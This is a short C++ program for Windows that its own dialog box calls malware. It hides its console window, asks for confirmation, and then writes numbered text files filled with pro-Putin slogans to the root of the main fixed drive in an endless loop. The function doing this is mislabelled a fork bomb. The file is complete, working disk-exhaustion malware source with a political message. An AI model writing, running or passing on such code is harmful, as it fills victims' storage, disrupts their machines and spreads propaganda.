#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string.h>
#include <string>
#include <thread>

#define MAX_PATH 260
#pragma warning(disable : 4996)

using namespace std;

class Functionality {
private:
	HWND window;
	int result1;
	DWORD result2;
	char buffer1[MAX_PATH] = { 0 };
	char main_drive[MAX_PATH];

	void get_main_drive() {
		result2 = GetLogicalDriveStringsA(MAX_PATH, buffer1);

		if (result2 > 0 && result2 <= MAX_PATH) {
			char* current_drive = buffer1;
			while (*current_drive) {
				if (GetDriveTypeA(current_drive) == DRIVE_FIXED && main_drive[0] == '\0') {
					strcpy(main_drive, current_drive);

					return;
				}
				current_drive += strlen(current_drive) + 1;
			}
		}
	}
public:
	Functionality() {
		AllocConsole();

		window = FindWindowA("ConsoleWindowClass", NULL);
		ShowWindow(window, 0);
	}
	
	int warning() {
		result1 = MessageBoxA(NULL, "Are you sure you want to run this malware?", "Warning...", MB_YESNO | MB_ICONWARNING);

		if (result1 == 6) {
			return 0;
		}
		else {
			return 1;
		}

	}
	
	void forkbomb() {
		int count = 1;
		get_main_drive();

		

		while (true) {
			string File_Name = "PutinIsCool";
			string the_string(main_drive);

			the_string.append(File_Name);

			the_string.append(to_string(count));
			the_string.append(".txt");


			ofstream TheFile(the_string);



			TheFile.close();

			ofstream AppendFile(the_string, ios::app);

			if (AppendFile.is_open()) {
				for (int i = 0; i < 1000; i++) {
					AppendFile << "Putin is the coolest guy ever!\n";
				}

				AppendFile.close();
			}
			
			count++;
		}	
	}

};

int main() {
	Functionality Obj;
	
	if (Obj.warning() == 1) {
		return 0;
	} 

	Obj.forkbomb();
	
	
	return 0;
}
